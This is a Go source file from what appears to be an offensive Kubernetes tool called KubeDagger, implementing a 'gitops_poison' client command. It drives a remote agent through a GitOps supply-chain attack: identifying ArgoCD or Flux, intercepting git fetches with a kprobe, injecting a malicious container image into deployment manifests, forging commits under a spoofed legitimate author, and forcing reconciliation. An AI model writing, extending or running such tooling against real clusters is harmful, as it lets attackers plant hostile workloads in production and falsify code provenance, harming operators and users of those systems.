package gitops_poison

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type PoisonResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool               `json:"success"`
}

func Execute(target, repo, targetPath, injectImage, output string) error {
	result := &PoisonResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{"discover_sync", "identify GitOps controller (ArgoCD/Flux) and tracked repositories", "gitops_discover"},
		{"clone_intercept", "intercept git clone/fetch operations via kprobe on connect() to repo", "gitops_intercept"},
		{"modify_manifest", "inject malicious container image into target deployment manifest", "gitops_modify"},
		{"forge_commit", "create commit with spoofed author matching legitimate committer", "gitops_commit"},
		{"trigger_sync", "force reconciliation loop to pick up modified manifests", "gitops_sync"},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + repo + "#" + targetPath + "#" + injectImage
		status := shared.SendCommand(target, "/gitops_poison", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
